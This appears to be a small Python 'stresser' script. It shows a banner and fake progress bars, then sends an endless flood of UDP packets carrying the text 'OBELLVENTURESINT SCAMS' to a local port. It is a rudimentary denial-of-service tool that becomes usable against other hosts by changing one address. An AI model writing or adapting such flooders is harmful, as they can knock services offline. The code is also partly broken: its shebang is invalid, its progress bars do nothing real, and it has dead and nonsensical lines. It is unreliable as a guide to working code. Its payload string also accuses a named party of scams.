#!bash/python
import socket
import pyfiglet
from tqdm import tqdm
from datetime import datetime
#----------------------------#
# Banner
ascii_banner = pyfiglet.figlet_format("NEED STRESSER", font="doom")
print(ascii_banner)
#----------------------------#
# Progress Bar
print("Scanning started at:" + str(datetime.now()))
for i, x in enumerate(list(range(100001))):
    print(i, end='\r')
loop = tqdm(total=1000000, position=0, leave=False)
for k in range(1000000):
    loop.set_description("Stressing...".format(k))
    loop.update(10)

# UDP Traffic Loop
while True:
    byte_message = bytes("OBELLVENTURESINT SCAMS", "utf-8")
    opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    opened_socket.sendto(byte_message, ("127.0.0.1", 8080))

    # I WANNA GO FAST RICKY BOBBY
    def verbose(*args, **kwargs): print(*args, **kwargs)
    verbose = True

# CTRL + C to end
loop.close()

